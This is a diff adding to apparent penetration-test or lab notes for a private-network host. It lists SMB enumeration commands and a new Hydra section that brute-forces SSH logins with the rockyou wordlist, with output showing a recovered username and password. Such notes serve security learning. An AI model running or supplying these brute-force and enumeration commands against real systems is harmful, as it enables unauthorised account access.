@@ -104,3 +104,18 @@ $ smbmap -H 192.168.3.20
 
 
 python3 /usr/share/doc/python3-impacket/examples/smbclient.py 192.168.3.20
+
+Bruteforce Hydra
+```bash
+$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.3.20                                                                                 
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-b
+inding, these *** ignore laws and ethics anyway).                                                                                                             
+                                                                                                                                                              
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-26 00:05:07                                                                            
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4                                         
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 71721995 login tries (l:5/p:14344399), ~4482625 tries per task                                            
+[DATA] attacking ssh://192.168.3.20:22/                                                                                                                       
+[STATUS] 177.00 tries/min, 177 tries in 00:01h, 71721819 to do in 6753:29h, 16 active                                                                         
+[STATUS] 140.00 tries/min, 420 tries in 00:03h, 71721579 to do in 8538:17h, 16 active                                                                         
+[22][ssh] host: 192.168.3.20   login: jan   password: armando 
+```
